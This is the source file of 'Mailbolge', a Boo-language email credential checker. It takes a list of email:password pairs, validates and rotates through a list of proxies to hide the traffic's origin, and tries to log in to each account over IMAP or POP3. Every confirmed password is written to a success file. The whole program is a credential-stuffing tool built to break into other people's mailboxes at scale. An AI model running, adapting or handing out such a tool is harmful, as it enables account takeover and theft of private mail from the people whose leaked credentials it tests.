# =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #
# Mailbolge mail scanner v0.03      #
# Developed in 2018 by V.A. Guevara #
# =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #

import System
import System.IO
import System.Net
import System.Threading
import System.Net.Sockets
import System.Threading.Tasks
import System.Collections.Generic
import System.Text.RegularExpressions
import System.Runtime.CompilerServices
import MailKit.Net.Pop3 from 'lib/Mailkit'
import MailKit.Net.Imap from 'lib/Mailkit'
import MailKit.Security from 'lib/Mailkit'
import Org.Mentalis.Network.ProxySocket from "lib/ProxySocket.dll"

#.{ [Classes]
class CUI:
	static final channels = {"fail": "Red", "success": "Cyan", "note": "DarkGray", "io": "Yellow",
		"fault": "DarkRed", "meta": "Green"}
	static final control = char('•')

	def constructor():
		dbg("")
		log("""# =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #
			# Mailbolge mail scanner v0.03      #
			# Developed in 2018 by V.A. Guevara #
			# =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #
			""".Replace('\t', ''), "meta")

	# --Methods goes here.
	def log(info, channel as string):
		lock Console:
			for chunk in "$info".Split(control):
				Console.ForegroundColor = Enum.Parse(ConsoleColor, channels[channel])
				Console.Write(chunk)
			Console.WriteLine()
			Console.ForegroundColor = ConsoleColor.Gray

	def dbg(info):
		Console.Title = "◢.Mailbolge$info.◣"
# -------------------- #
class DiskReport:
	final pref		= ""
	final succfile 	= null
	final failfile	= null
	final channels	= {}

	def constructor(title as string):
		pref				= IO.Path.GetFileName(title)
		succfile, failfile	= (File.CreateText(req("$f.txt")) for f in ('success', 'fail'))
		channels			= {"success": succfile, "fail": failfile}

	def echo(info, channel as string):
		out = channels[channel] as StreamWriter
		out.WriteLine(text = "$info")
		out.Flush()
		return text

	def req(fname as string):
		return "$pref~$fname"
# -------------------- #		
class Box:
	public final server		= ""
	public final user	 	= ""
	public final password	= ""
	public final brake	= CancellationTokenSource()
	private client as duck
	public proxy as Proxy

	# --Methods goes here.
	def constructor(server_ as string, user_ as string, password_ as string):
		server, user, password = server_.ToLower(), user_, password_

	def connect(use_imap as bool):
		# Connection preparations.
		client	= (ImapClient	if use_imap else Pop3Client)()
		port	= (993			if use_imap else 995)
		host	= ("imap"		if use_imap else "pop") + ".$(server.reroute())"
		sock	= proxy.socket	if proxy
		# Actual connection.
		try:
			if sock:
					sock.Connect(host, port)
					client.Connect(sock, host, port, SecureSocketOptions.Auto, brake.Token)
			else:	client.Connect(host, port, SecureSocketOptions.Auto, brake.Token)
			return client
		except ex:
			client.Dispose()
			sock.Dispose() if sock

	def probe():
		try: 
			service.Authenticate(email, password, brake.Token)
			return "open"
		except ex:
			if ex.Message.StartsWith("Please log in via your web browser"): return 'auth'
			else: return 'fail'
		return self

	[Extension] static def reroute(server as string):
		if server in ["lenta.ru"]: return "rambler.ru"
		return server

	override def ToString():
		return "$email:$password"

	email:
		get: return "$user@$server"

	service:
		get:
			unless client:
				unless client = connect(true): client = connect(false)
			return client

	def destructor():
		client.Dispose() if client
# -------------------- #
class Proxy:
	public final ip as IPAddress
	public final port		= 0
	public final user		= ""
	public final password	= ""
	public final type as ProxyTypes

	# --Methods goes here.
	def constructor(url as Uri):
		ip		= Dns.GetHostEntry(url.Host).AddressList[0]
		port 	= url.Port
		if url.UserInfo: user, password = url.UserInfo.Split(char(':'))
		for t in (ProxyTypes.Https, ProxyTypes.Socks4, ProxyTypes.Socks5):
			return if type = t and test()
		type = ProxyTypes.None

	def test():
		return Box("mail.ru", "I am", "Error", proxy: self).connect(false)

	override def ToString():
		return "proxy://$ip:$port"

	socket:
		get:
			sock = ProxySocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
			sock.ProxyEndPoint = IPEndPoint(ip, port)
			sock.ProxyUser = user
			sock.ProxyPass = password
			sock.ProxyType = type
			return sock
# -------------------- #
class Mailbolge:
	final proxlist		= List[of Proxy]()
	final log			= {info, channel|info = ':I am Error:'; return self}
	final dbg			= {info|info = ':I am Error:'; return self}
	final hardlimit		= SemaphoreSlim(byte.MaxValue)
	final reporter		= void
	private progress	= 0

	# --Methods goes here.
	def constructor(ui as duck, storage as Type):
		log	= {info, channel|ui.log(info, channel); return self}
		dbg	= {info|ui.dbg(info); return self}
		reporter = storage

	def checker(box as Box, dest as duck):
		return def():
			# Initial setup.
			hardlimit.Wait()
			# Actual check-up.
			if box.proxy = proxlist.get_next():	log("Launching check through •$(box.proxy)• for •$(box)•", 'note')
			else: log("Launching check for •$(box)•", 'note')
			if result = box.probe() == "fail":
				log("Unable to access •$(box.email)• with password •$(box.password)•", 'fail')
				dest.echo(box, 'fail')
			else:
				log("Password for •$(box.email)• confirmed: •$(box.password)•", 'success')
				dest.echo(box, "success")
			# Finalization.
			hardlimit.Release()
			progress++

	def proxy_checker(entry as string, brake as CancellationToken):
		url	= Uri((entry if entry.Contains("://") else "proxy://$entry"))
		return def():
			# Initial setup.
			hardlimit.Wait()
			# Actual checking.
			try: (proxy = Proxy(url))
			except: pass
			unless brake.IsCancellationRequested: # Async is awesome.
				if proxy and proxy.type: log("├> Succesfully registered •$(url)•", 'success').proxlist.Add(proxy)
				else: log("├* Unable to connect through •$(url)•", 'fail')
				progress++
			# Finalization.
			hardlimit.Release()


	[Extension] static def to_box(entry as string):
		if Regex.Matches(entry, ":").Count == 1:
			box, password = entry.Split(char(':'))
			if Regex.Matches(box, "@").Count == 1:
				user, server = box.Split(char('@'))
				return Box(server, user, password)

	[Extension] static def get_next[of T](list as List[of T]):
		if list.Count:
			list.Add(entry = list[0])
			list.RemoveAt(0)
			return entry

	[Extension] static def account(num as int):
		return ("$num" if num else "No")

	[Extension] static def reminder(func as TimerCallback):
		return Timer(func, null, 0, 200)

	proxies:
		set:
			# Preparation phase.
			dbg("/[proxy]")
			progress	= 0
			tasks		= List[of Task]()
			brake		= CancellationTokenSource()
			# Parsing phase.
			try:
				log("┌Registering proxies from '•$(value)•':", 'io')					
				for entry in File.ReadLines(value):
					try: tasks.Add(Task.Run(proxy_checker(entry, brake.Token), brake.Token))
					except ex: log("│Invalid URL provided: •$(entry)•", 'fault')
			except ex: log("└$ex", 'fault')
			# Wait phase.
			using {dbg("::$(Math.Round(progress*100.0/tasks.Count, 1))% [proxy]")}.reminder():
				unless Task.WaitAll(tasks.ToArray(), 1000 * 60 * 10):
					log("│-Proxy registration was cancelled due to timeout.", 'fault')
				brake.Cancel()
				log("└•$(proxlist.Count.account())• proxies was added to list.\n", 'io')

	feed:
		set:
			# Preparation phase.
			dbg("/[feed]")
			progress	= 0
			tasks		= List[of Task]()
			# Parsing phase.
			try:
				log("Parsing '•$(value)•'...", 'io')
				dest	= reporter(value)
				for entry in File.ReadLines(value):
					if box = entry.to_box():
						tasks.Add(Task.WhenAny(Task.Run(checker(box, dest)), Task.Delay(20000)))
					else: log("Invalid entry encountered: •$(entry)•", 'fault')
			except ex: log(ex, 'fault')
			# Wait phase.
			using {dbg("::$(Math.Round(progress*100.0/tasks.Count, 1))%")}.reminder():
				Task.WaitAll(tasks.ToArray(), -1)
				log("•$((progress.account() if progress else 'No'))• email adresses was tested.\n", 'io')
#.}

# ==Main code==
def Main(argv as (string)):
	AppDomain.CurrentDomain.AssemblyResolve += def(sender, e):
		return Reflection.Assembly.LoadFrom("lib/$(Reflection.AssemblyName(e.Name).Name).dll")
	Mailbolge(CUI(), DiskReport, proxies: "proxy.lst", feed: (argv[0] if argv.Length else 'feed.txt'))
	Threading.Thread.Sleep(3000)